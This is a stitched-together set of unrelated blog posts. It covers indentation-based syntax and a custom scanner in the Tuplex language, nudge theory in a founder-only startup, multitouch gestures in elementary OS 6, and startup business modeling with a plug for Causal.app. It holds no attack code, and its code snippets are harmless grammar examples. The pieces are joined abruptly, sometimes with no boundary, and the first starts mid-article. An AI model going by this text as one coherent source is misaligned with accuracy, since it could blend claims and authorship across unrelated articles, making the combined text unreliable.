<p>Semicolons are now optional. A newline is in most cases sufficient statement terminator.</p>

<p>One-liners are written like this:</p>

<div><div><pre><code>if flag: v = 128; else: v = 256
</code></pre></div></div>

<h3 id="drawbacks">Drawbacks</h3>

<p>Most programming languages do not use significant whitespace. Instead they use explicit printable tokens,
such as begin/end or { }. This makes it easier to implement parsers,
easier to programmatically generate source code (or embed source code within other files and programs),
and reduces risks of ambiguities in the grammar.</p>

<p>Explicit scope / suite enclosure also makes it easier to format statement lines and blocks as the
programmer sees fit. One can distribute a long statement across several lines,
or list several short statements as a concise one-liner. It separates source formatting from program logic.</p>

<p>If indentation is significant it means the tabs-or-spaces question is no longer entirely facetious.
In any given source text one or the other must be chosen. Although the parser can count both tab and space
characters just fine, it is debatable how many spaces shall correspond to a tab,
and above all they are not visually distinguishable.
Mixing tabs and spaces leads to ambiguity for the programmer, and is therefore disallowed.</p>

<h3 id="good-bye-curly-braces">Good-bye curly braces</h3>

<p>Python popularized the indentation-defined syntax and showed it can be combined with a largely elegant and
unambiguous grammar if the whole language syntax is designed with this approach in mind.</p>

<p>Curly braces are clear in meaning and stand out visually. But above all they are for the benefit of the parser,
not the programmer. Braces (or begin/end keywords) make it significantly easier to parse blocks and program structure.</p>

<p>A good programmer will indent the code consistently anyway. Braces only rarely convey meaning to a human reader
that isn’t already apparent from the indentation, which means they are typically redundant to the human.
If they are redundant they add noise that the programmer must look past, and if they also stand out visually
more attention must be spent on it.</p>

<p>In short, braces are for parsers and indentation is for programmers. Tuplex strives to impose a minimum of syntactic
and grammatical artefacts, and eliminate redundancy and boilerplate as much as possible. Thus the choice to 
reduce visual friction rather than make parser implementation easier.</p>

<h3 id="good-bye-semicolons">Good-bye semicolons</h3>

<p>Semicolons are optional, for much the same reasons as braces. The newline is in most cases a very natural statement
terminator. Semicolons may still be specified, for example to denote the empty (no-op) statement, or to separate
multiple statements on the same line.</p>

<p>Some statements get very long, for example long argument lists and complex long condition expressions are not that uncommon.
To facilitate this, a line that ends with a comma will have its linebreak ignored.
And in order to write a long expression across multiple lines it can be enclosed in parentheses.</p>

<p>Generally, any source text enclosed in (parentheses), [brackets], or {braces} will ignore line breaks.</p>

<h3 id="attempts-at-supporting-both-indentation-defined-and-brace-defined-syntax">Attempts at supporting both indentation-defined and brace-defined syntax</h3>

<p>With the existing grammar parser (built using Bison) there are still some limitations on how smart it can be
parsing the indentation- and newline-defined syntax. This causes some extended one-liner constructs to still
require braces, or an occasional extra semicolon at the end.</p>

<p>I explored a grammar design that would allow for both worlds, both brace-enclosed and
indentation-defined blocks, used and mixed as the programmer sees fit.
However this leads to a bunch of edge cases, and the biggest
problem is that resolving them requires ad-hoc rules for the grammar - there is
no intuitive “obviously correct way” when mixing them.</p>

<p>Consider for example, if allowing brace-enclosed and indentation-defined blocks within each other,
what a consistent treatment of these blocks would be:</p>

<div><div><pre><code>if condition: {
        brace-enclosed body  ## note - INDENT
    }  ## note - DEDENT...
    {
        body part 2 with its own var-scope
    }

if condition:
    ## can an if-true-body now consist of several brace-enclosed blocks because they have similar indentation?
    {
        body part 1 with its own var-scope
    }
    {
        body part 2 with its own var-scope
    }
else:
    something_else()
</code></pre></div></div>

<p>In the end, I enabled support for brace-enclosed scopes but disallowed mixing them with indentation-defined ones.
Within braces, INDENT, DEDENT, and NEWLINE are simply ignored (same as between parentheses and brackets).</p>

<h4 id="consistent-rules">Consistent rules</h4>

<p>A couple of specific rules needed to be defined to avoid ambiguities.</p>

<p>A. Within braces, all statements must be terminated with semicolon. (This makes the syntax similar to C et al.)</p>

<p>B. The colon must be on the same line as the preceding statement in order to prevents this sort of ambiguity:</p>

<div><div><pre><code>if condition
    :            ## INDENT
    something()  ## no INDENT...

if condition
    : something()   ## INDENT
      other()       ## inconsistent INDENT
</code></pre></div></div>

<p>C. One-liner syntax can’t be mixed with indentation body syntax. This is an error:</p>

<div><div><pre><code>if condition: do_this()
    do_that()
</code></pre></div></div>

<p>D. Brace-enclosure is needed to support single-line statement suites:</p>

<div><div><pre><code>if cond1: do_a(); else: if cond2: { do_b(); do_c(); } else: do_d()
</code></pre></div></div>

<p>E. For lambda expressions within statements, an extra semicolon can be necessary:</p>

<div><div><pre><code>localFunc := ( a : Int )-&gt;Int : return a * 2; ;
</code></pre></div></div>

<p>Without a custom context-sensitive grammar / recursive descent parser the last semicolon above is hard to
avoid. In the current Tuplex grammar it is necessary.
The first semicolon terminates the lambda body’s statement; the second terminates the assignment statement.</p>

<h3 id="implementing-a-custom-scanner">Implementing a custom scanner</h3>

<p>The lexical scanner needs to understand both line structure, scope structure and token syntax. This
was difficult to implement with the Flex scanner Tuplex was originally built with.
So I built a custom scanner from scratch.</p>

<p>It was quite fun, and ended up being fairly efficient. I did manage to avoid writing an entire
regexp-engine while allowing for a decent amount of flexibility in evolving the lexemes and tokens
of Tuplex. Some benefits of the custom implementation include better support for edge cases in
string formatting syntax and in floating point literals.</p>

<p>One thing it doesn’t quite support at this stage is unicode. Tuplex shall support proper UTF-8 eventually,
but at that point the scanner will need some tweaking to not assume single-byte characters.</p>

<p>Since Bison expects a Lex/Flex interface I also wrote a facade for the scanner to translate between their
handling of line/positions and semantic values of literals. Also, since the previous Flex scanner
handled file reading, I had to write a file-to-memory reader to replace it.</p>

<p>Long-term I will probably replace the Bison-generated parser with a custom one as well, but I’m putting it
off as long as I can. Bison can handle almost everything Tuplex needs. There are some edge cases around
NEWLINE interpretation (e.g. the extra semicolon requirement above),
but I think Tuplex can live with that for the time being!</p>

				<p>Let’s imagine a two person startup where each co-founder is equal and there are no roles.</p>

<p>Now suddenly any number of corporate trappings of software development fall away:</p>
<ul>
  <li>There is no ‘management’ - neither co-founder can fire the other or set their salary</li>
  <li>There are no dedicated roles like program managers, product managers, marketing, sales - anyone can be
assigned anything</li>
</ul>

<p>One might imagine that in such an environment all <a href="https://techbeacon.com/app-dev-testing/project-management-surefire-way-kill-your-software-product">project management</a>
falls away and the startup is a developer utopia. <em>That’s not what happens.</em></p>

<p>Instead all of the pressure to deliver on intermediate milestones remains and <em>we</em> are the bad old boss who get’s blamed when things don’t get done.
So how do we influence productivity in a manager-free environment?</p>

<p>This is where <a href="https://en.wikipedia.org/wiki/Nudge_theory">nudge theory</a>, influencing behaviour without coercion,
comes to the forefront - maybe it’s really the most important in more corporate settings also but there are
too many distractions to realize.</p>

<p>In startups, things that appear to be gospel truth frequently turn out to just be nudges.
This early paper on <a href="https://hbr.org/2013/05/why-the-lean-start-up-changes-everything">lean startup</a>
gives the example of Blue River Technology that very quickly learned that robotic lawn mowers for golf courses
were not a viable market and an automated way to kill weeds without chemicals was.</p>

<p>With the advantage of seven years hindsight two things are obvious:</p>
<ul>
  <li><a href="https://www.husqvarna.com/us/lawn-and-garden/professional/professional-robotic-mowers/automower-for-golf-courses">Robotic lawn mowers for golf courses</a>
are a market.</li>
  <li><a href="http://smartmachines.bluerivertechnology.com/">Blue River Technology</a> builds targeted automation to kill weeds
<strong>with chemicals</strong>.</li>
</ul>

<p>From the nudge theory point of view software developers are surrounded by nudges:</p>
<ul>
  <li>Language selection - ultimately one can do anything equally in Java and Python with enough effort. However a
language with a HotSpot compiler is going to nudge towards larger, more permanent servers.</li>
  <li>CI/CD tools are a nudge towards quicker deliver cycles.</li>
  <li>Remote technologies are a nudge towards potentially more productive work style options</li>
  <li>Available marketing channels are a nudge towards whatever can be sold via those channels</li>
</ul>

<h3 id="some-nudges-are-the-result-of-mostly-external-factors-but-some-involve-making-choices-about-our-environment">Some nudges are the result of mostly external factors but some involve making choices about our environment.</h3>

<p>Since tools are a nudge under our control everyone in software development should pay extra attention to them.</p>

December 1, 2020 | https://blog.elementary.io/multitouch-gestures-in-elementary-os-6/ | <a href="https://web.archive.org/web/*/https://blog.elementary.io/multitouch-gestures-in-elementary-os-6/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <p>One of the most hotly requested features for years has been to have multi-touch gestures in elementary OS, and with 6.0 I’m excited to say that we will deliver. Like the <a href="https://blog.elementary.io/dark-style-progress/">dark style preference</a>, delivering a great multi-touch experience is a little more complicated than it seems on the surface. There have been some 3rd party tools to detect touchpad gestures and then trigger actions after-the-fact, but it wasn’t until recently that we’ve had the technical ability to provide smooth, responsive animations that track 1:1 with your finger movement across a touchpad or touch screen.</p>

<h2 id="window-manager-gestures">Window Manager Gestures</h2>

<p>We’ve had the great pleasure of working with <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/sponsors/JoseExposito">José Expósito</a>, the author of Touchégg, on our window manager gestures. In elementary OS 6, we use Touchégg Daemon behind the scenes to capture input events and communicate them to Gala, our window manager.</p>

<figure>
  <p><img src="https://blog.elementary.io/images/multitouch-gestures-in-elementary-os-6/multitasking.gif" alt="Multitasking View"></p>
  <figcaption>1:1 multi-touch gestures used for Multitasking View</figcaption>
</figure>

<p>At the moment, we’re reviewing two proposals: one for the multitasking view and another for switching workspaces directly. Both of these use 1:1 responsive, finger-tracking gestures that can be peeked or canceled at any time. When special animations aren’t available in the window manager, such as when tiling, we fall back to animations built in to Touchégg.</p>

<figure>

  <figcaption>1:1 multi-touch gestures used for switching workspaces</figcaption>
</figure>

<p>We’re still discussing exactly what the default configuration should be, but work is already underway on System Settings so that you can choose whichever gestures feel most comfortable for you—or choose none at all.</p>

<figure>

</figure>

<p>If you’d like to support José’s work on multi-touch gestures for elementary OS 6—and other Linux-based operating systems—you can do so with as little as $2/mo on <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/sponsors/JoseExposito">GitHub Sponsors</a>.</p>



<h2 id="app-gestures">App Gestures</h2>

<p>In order to make gestures work globally, previous solutions have opted to emulate keyboard shortcuts after a gesture was completed. This is effective, but animations—if they’re provided at all—don’t feel connected to users’ input. Instead, in elementary OS 6 we’re making use of Handy, a library originally developed for <a rel="nofollow noopener noreferrer" target="_blank" href="https://puri.sm/">Purism</a> and their Open Source phone platform. This means that each app and desktop component must be updated to support gestures individually, which is ultimately a lot more work but a vastly superior experience.</p>

<h3 id="paging">Paging</h3>

<figure>
  <p><img src="https://blog.elementary.io/images/multitouch-gestures-in-elementary-os-6/appcenter.gif" alt="AppCenter Screenshots"></p>
  <figcaption>Paging screenshots in AppCenter</figcaption>
</figure>

<p>In elementary OS 5, we used Handy to add gestures for switching pages to the applications menu and during onboarding. So far, in elementary OS 6 this has been extended to the Date &amp; Time indicator to switch months in the calendar view and to AppCenter to switch between screenshots. This makes use of the <a rel="nofollow noopener noreferrer" target="_blank" href="https://valadoc.org/libhandy-1/Hdy.Carousel.html">Handy Carousel</a> widget which also provides a smooth transition between page indicator dots when needed. Our plan is to provide gestures any time pages are used and we’re already tracking issues for Calendar and more.</p>

<h3 id="navigation">Navigation</h3>

<p>Another place we’ve implemented gestures is while navigating between panes or views. This is using the <a rel="nofollow noopener noreferrer" target="_blank" href="https://valadoc.org/libhandy-1/Hdy.Deck.html">Handy Deck</a> widget which contains a concept of next and previous views and shows views in a neat stack. Swipe-to-go-back is now implemented in elementary OS 6 in Feedback, in the Installer and Initial Setup views for configuring locale variants, and in Systems Settings → Keyboard when adding new layouts. Gestures are also now available natively in WebkitGtk and therefore Epiphany also provides swipe navigation for both back and forward.</p>

<figure>
  <p><img src="https://blog.elementary.io/images/multitouch-gestures-in-elementary-os-6/keyboard-layouts.gif" alt="Keyboard Layouts"></p>
  <figcaption>Navigating when adding keyboard layouts in System Settings → Keyboard</figcaption>
</figure>

<p>Some more complex navigation situations are in progress such as when navigating between views in System Settings itself and in AppCenter. There are also open issues for navigating in Files and Photos, but development hasn’t yet started there. Working with Handy Deck in these situations has exposed some inefficiencies in the way navigation was implemented previously so not only are we implementing a new feature, but the underlying code is being made more robust and optimized.</p>

<h3 id="other">Other</h3>

<p>We’re also looking into other uses for gestures as popularized in mobile operating systems, such as swipe to dismiss. In elementary OS 6, you can now dismiss notification bubbles from the desktop with a swipe, and remove them from the notifications indicator by swiping in either direction as well. We haven’t implemented swipe-to-dismiss in other types of lists yet, but we’re open to suggestions! You can follow along with our <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/orgs/elementary/projects/61">progress and plans on GitHub</a>, as well as file feature requests.</p>

<figure>
  <p><img alt="Notification Center" src="https://blog.elementary.io/images/multitouch-gestures-in-elementary-os-6/notification-center.gif" width="399" height="672"></p>
  <figcaption>Notification bubbles being swiped away in the new Notification Center</figcaption>
</figure>

<p>A quick note about pinch-to-zoom and rotate, at the moment we don’t yet have a way to implement these more complex gestures. We may have to wait until we can provide GTK4 in a Flatpak or for elementary OS 7 before it becomes possible to provide gestures for transforms.</p>

<p>Lastly, I just wanted to say thank you to <a rel="nofollow noopener noreferrer" target="_blank" href="https://twitter.com/alexm_gnome">Alexander Mikhaylenko</a> for being available for questions and feature requests as we implement Handy in our apps. He’s been an essential resource and very open to improving Handy for our use cases.</p>

<h2 id="get-early-access">Get Early Access</h2>

<p>If you’re excited by what you read here and want to get your hands on the developer preview of elementary OS 6, you can! GitHub sponsors at the $10/mo or above tier get access to our <a rel="nofollow noopener noreferrer" target="_blank" href="https://builds.elementary.io/">daily builds server</a> where you can test the latest and greatest experimental builds, including builds for Pinebook Pro. Subscribing helps us fund the development of elementary OS and brings us that much closer to delivering the final product.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>Note:&nbsp;this was originally published at </em><a href="https://alexoppenheimer.substack.com/" target="_blank"><em>https://alexoppenheimer.substack.com/</em></a>‍</p><p>For the last 10 years I have been working in startup finance. This has taken a few different forms, but has recently been focused on helping early stage (and occasionally late stage) companies with their business models. I also do financial models, budgets, forecasts, company analyses, projections and even some accounting. But for me, modeling is the most important and interesting part of the startup finance puzzle and should be the bit of finance that every executive and manager understands. So what is modeling?</p><p>To understand the role of modeling, I go back to my education in mechanical engineering and the 3D CAD (computer-aided design) models we built before we started manufacturing a device.</p><figure><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5fc412640ef9e617f7e25aef_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F52abc583-2e3f-46b0-94e4-c01f245d6328_1404x729.png" alt="What Is Onshape?"></p></figure><p>What is the purpose of these models?</p><ul role="list"><li>Create a digital representation of a physical device</li><li>Run digital simulations on it and understand how it will react in the real world</li><li>Guide the manufacturing plan</li></ul><p>The most important aspect of any model is that it <strong><em>accurately reflects the physical reality</em></strong>. Think about a model of a bicycle - it is critical that it looks like a bicycle but also that the wheels spin and that when you turn the pedals it makes the chain move the sprockets to turn the rear wheel. If that does not happen, it is a pretty useless model. It might be visually accurate but does not represent the mechanics of the device, which is the purpose of a model.</p><figure><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5fc41266f585391c24928086_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F141b75d2-9182-465f-9d55-26e79f2268f0_400x300.gif" alt="Lucy Conklin Illustration: bike gif"></p></figure><p>Inputs → Mechanics → Outputs needs to make sense for how the device actually works in order for the model to have value.</p><p>A business model needs to work the same way. Inputs, mechanics and outputs need to accurately represent how the business functions.</p><ul role="list"><li><strong>Inputs</strong> should be in two groups:</li><li>Things that we control that impact our business (i.e. advertising spend, pricing).</li><li>Things that we do not necessarily control but that we can measure and potentially influence that impact our business (i.e. taxes, churn).</li></ul><ul role="list"><li><strong>Mechanics</strong> of the business then need to flow logically based on the operations and strategy. Operations are a combination of people, technology and process. The people include executives, managers and individual contributors.</li></ul><ul role="list"><li><strong>Outputs</strong> are the key success metrics for a business. These can be top line metrics (i.e. users, revenue), bottom line metrics (i.e. net income, cash flow) or ratios (i.e. sales efficiency, growth).</li></ul><p><strong>Stringing all of this together in just the right way and at the right level of detail is the art of modeling.</strong></p><p>I always start modeling exercises on a piece of paper in order to visually map out how the business functions before talking numbers or taking it into a modeling tool.</p><p>A good model answers questions like "what will this business look like at scale?" "will we ever be profitable?" "if we spend X on marketing, how quickly can we grow?" "how much funding do we need to achieve our goals?" "How many sales people do we need in order to grow to $X of revenue?" "If our efficiency decreases by X% can we still make money?"</p><p>A good model starts with a strong product vision and clear ideas about how the business operates and aims to quantify them.</p><p>A good model does not need accurate input assumptions to be a useful exercise, though it definitely helps. This is what the phrase "garbage-in garbage-out" comes from - a great model cannot compensate for weak inputs. I have seen some businesses where there is gold going in and gold coming out despite the model being a mess, but these are very rare. I have seen many more businesses that have gold going in, a weak model and then the gold that is initially coming out devolving into garbage. (Happy to discuss this dynamic in more detail as it usually a result of not understanding the aforementioned business dynamics.)</p><p>The power of a good model is understanding how changes in the inputs will impact the outputs and how operational changes impact the model itself.</p><p>A model is a top-down tool you can use in order to set goals and build effective budgets from the bottom up.</p><p>A company at the ideation stage can benefit from a model and so can a fully scaled business, albeit in different ways. Often the model building exercise is more important than the specific outputs or conclusions. The process should give the operator clarity on the key levers in the business, how they interact and what the company can do operationally to achieve company goals.</p><p><strong>Understanding the nuanced relationship between these financial tools and exercises is a huge asset to any operator and the specifics can vary widely for different companies and at different stages. This is the short answer for why I focus on bringing a sophisticated financial approach to early stage companies - to unlock the power of the financial and modeling perspective as an operating asset that improves efficiency and visibility by empowering data-driven decisions.</strong></p><p>It wouldn't be a SaaS Engineering post if I didn't talk about <a href="https://www.causal.app/">Causal.app</a>: Causal is a tool that allows people to focus clearly on <strong>modeling</strong>. By separating inputs, calculations and outputs, having visual references and straightforward visuals, the product makes it clear to the user how the inputs flow through the model and into the outputs, which is the purpose of a model. It opens up the power to quickly build an accurate and useful model to any operator instead of limiting it to excel whizzes. Nobody understands a business as well or as intuitively as its founders.</p><p>Giving founders without finance backgrounds the ability to quantitatively represent their businesses provides them a valuable decision-making tool and method to validate their instincts. The beauty of Causal is that it is built for business modeling, budgeting, forecasting, financial modeling, and even accounting, and allows you to <strong>integrate all of these tools in one place,</strong> comparing projections vs. actuals and bringing in historical data for real-time updates.</p><p>As always, feel free to reach out directly with any questions or comments and take a look at this operationally-focused SaaS model in Causal: <a href="https://my.causal.app/models/1378">https://my.causal.app/models/1378</a></p><p>Causal also allows you to input ranges like “10% to 15%” as assumptions and then see how those ranges flow through the entire model.</p><p>I have found there is some confusion about the different tools in a the finance toolbox and what purpose they serve. Four other important tools are:</p><ul role="list"><li><strong>Budgeting</strong>. The detailed exercise of figuring out how much money is going out of or into the business (usually in the near term). Budgeting includes things like detailed hiring plans, line-item expenses, by-channel ad spend, etc. Budgeting is like the manufacturing process plan that I mentioned above. I have found that budgeting revenue is not super valuable outside pipeline analysis exercises.</li><li><strong>Accounting</strong>. This is what the government needs to see and is the official record of a business. Accounting rules do not usually map well to a company's specific business metrics and should rarely be used to guide the business. Accounting should generally not involve an "artistic" element like I mentioned before with respect to modeling (the government does not like art in its financial records).</li><li><strong>Forecasting</strong>. The projection of where the business will land. It is often a combination of the model and the budget, and then figuring out where the business will be compared to pre-determined goals. This is a regular exercise that gives clarity to operators on how they are doing. It should also help uncover operational issues.</li><li><strong>Financial Modeling</strong>. This is a specific type of business modeling that generally involves income statement, cash flow statement and balance sheet, and illustrates how they interact with each other. A financial model is most valuable in the context of a transaction - equity, debt or change of control. In many ways, it is a combination of modeling and accounting.</li></ul><p>‍</p></div></div>]]>
